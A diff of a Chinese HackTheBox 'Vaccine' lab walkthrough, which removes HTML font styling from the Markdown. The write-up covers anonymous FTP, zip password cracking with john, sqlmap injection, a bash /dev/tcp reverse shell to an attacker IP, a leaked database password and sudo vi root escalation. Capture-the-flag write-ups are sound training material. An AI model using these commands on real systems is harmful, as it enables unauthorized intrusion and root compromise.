@@ -34,11 +34,11 @@ anonymous 匿名用户
 ## TASK 4
 ![](/image/hackthebox/Vaccine-6.png)
 
-<font style="color:rgb(25, 27, 31);">bin或者binary</font>
+bin或者binary
 
-<font style="color:rgb(25, 27, 31);">设置文件传输类型为二进制传输类型。一般默认为ascii传输类型，但是使用ascii模式传输类似于可执行文件时，会造成传输的文件内容不对。因此建议在上传或者下载文件之前，执行 </font><font style="color:rgb(25, 27, 31);background-color:rgb(248, 248, 250);">bin</font><font style="color:rgb(25, 27, 31);"> 命令将文件传输类型设置为二进制传输类型。</font>
+设置文件传输类型为二进制传输类型。一般默认为ascii传输类型，但是使用ascii模式传输类似于可执行文件时，会造成传输的文件内容不对。因此建议在上传或者下载文件之前，执行 bin 命令将文件传输类型设置为二进制传输类型。
 
-<font style="color:rgb(25, 27, 31);">get 文件名即可</font>
+get 文件名即可
 
 ![](/image/hackthebox/Vaccine-7.png)
 
@@ -46,8 +46,8 @@ anonymous 匿名用户
 
 使用john进行爆破
 
-<font style="color:rgb(77, 77, 77);">压缩包中存在index.php，使用弱密码尝试解压压缩包，发现行不通，那就需要用到爆破工具来爆破密码了</font>  
-<font style="color:rgb(77, 77, 77);">这时候会用到john的zip2john脚本，将加密压缩包的密码hash值导出到文件中，再用john对其进行爆破</font>
+压缩包中存在index.php，使用弱密码尝试解压压缩包，发现行不通，那就需要用到爆破工具来爆破密码了  
+这时候会用到john的zip2john脚本，将加密压缩包的密码hash值导出到文件中，再用john对其进行爆破
 
 ![](/image/hackthebox/Vaccine-8.png)
 
@@ -86,32 +86,32 @@ sqlmap -u [http://10.129.92.36/dashboard.php?search=1](http://10.129.92.36/dashb
 
 ![](/image/hackthebox/Vaccine-13.png)
 
-<font style="color:rgb(25, 27, 31);">发现命令行不太对劲</font>
+发现命令行不太对劲
 
-<font style="color:rgb(25, 27, 31);">进行反弹下shell</font>
+进行反弹下shell
 
-<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">/bin/bash -c 'bash -i >& /dev/tcp/</font><font style="color:rgb(13, 13, 13);">10.10.16.20</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">/4444 0>&1'</font>
+/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.20/4444 0>&1'
 
 ![](/image/hackthebox/Vaccine-14.png)
 
 成功反弹shell
 
-<font style="color:rgb(25, 27, 31);">find / -group </font>**<font style="color:rgb(255, 255, 255);background-color:rgb(20, 29, 43);">postgres </font>**<font style="color:rgb(25, 27, 31);"> 2>/dev/null</font>
+find / -group **postgres ** 2>/dev/null
 
-<font style="color:rgb(25, 27, 31);">发现大量可执行文件</font>
+发现大量可执行文件
 
-<font style="color:rgb(77, 77, 77);">使用</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">sudo -l</font><font style="color:rgb(77, 77, 77);">查看我们有哪些命令可以sudo使用</font>
+使用sudo -l查看我们有哪些命令可以sudo使用
 
 ![](/image/hackthebox/Vaccine-15.png)
 
-<font style="color:rgb(77, 77, 77);">在nmap的扫描结果中知道靶机用的是apache服务，那就可以去</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">/var/www/html</font><font style="color:rgb(77, 77, 77);">目录看下，发现有个dashboard.php</font>
+在nmap的扫描结果中知道靶机用的是apache服务，那就可以去/var/www/html目录看下，发现有个dashboard.php
 
-> <font style="color:rgb(77, 77, 77);"> $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");</font>
+>  $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
 >
 
-<font style="color:rgb(77, 77, 77);">发现密码，直接ssh连接即可</font>
+发现密码，直接ssh连接即可
 
-<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">ssh postgres@10.129.92.36</font>
+ssh postgres@10.129.92.36
 
 ![](/image/hackthebox/Vaccine-16.png)
 
@@ -125,16 +125,16 @@ sqlmap -u [http://10.129.92.36/dashboard.php?search=1](http://10.129.92.36/dashb
 ## TASK 9
 ![](/image/hackthebox/Vaccine-19.png)
 
-由于<font style="color:rgb(77, 77, 77);">发现我们可以sudo使用vi编辑/etc/postgresql/11/main/pg_hba.conf文件，那么就可以用sudo vi提权</font>
+由于发现我们可以sudo使用vi编辑/etc/postgresql/11/main/pg_hba.conf文件，那么就可以用sudo vi提权
 
-<font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">进入vi界面后可能会界面重叠，直接输入</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">:!/bin/bash</font><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">再点击回车即可，输入</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">whoami</font><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">发现已经成功提权为root</font>
+进入vi界面后可能会界面重叠，直接输入:!/bin/bash再点击回车即可，输入whoami发现已经成功提权为root
 
-> <font style="color:rgb(13, 13, 13);">在Vi编辑器中，</font>**<font style="color:rgb(13, 13, 13);">!</font>**<font style="color:rgb(13, 13, 13);">是用来执行shell命令的一个命令行操作符。当你在Vi编辑器中按下</font>**<font style="color:rgb(13, 13, 13);">!</font>**<font style="color:rgb(13, 13, 13);">后，它会让你在编辑器中执行一个外部的shell命令，并显示输出结果。例如，你提到的</font>**<font style="color:rgb(13, 13, 13);">!/bin/bash</font>**<font style="color:rgb(13, 13, 13);">将会执行</font>**<font style="color:rgb(13, 13, 13);">/bin/bash</font>**<font style="color:rgb(13, 13, 13);">这个shell，并进入到一个交互式的bash环境中。</font>
+> 在Vi编辑器中，**!**是用来执行shell命令的一个命令行操作符。当你在Vi编辑器中按下**!**后，它会让你在编辑器中执行一个外部的shell命令，并显示输出结果。例如，你提到的**!/bin/bash**将会执行**/bin/bash**这个shell，并进入到一个交互式的bash环境中。
 >
 
-<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">dd6e058e814260bc70e9bbdef2715849</font>
+dd6e058e814260bc70e9bbdef2715849
 
-<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">{感觉这个靶机相较于前面靶机简单好多好多}</font>
+{感觉这个靶机相较于前面靶机简单好多好多}
 
 
 
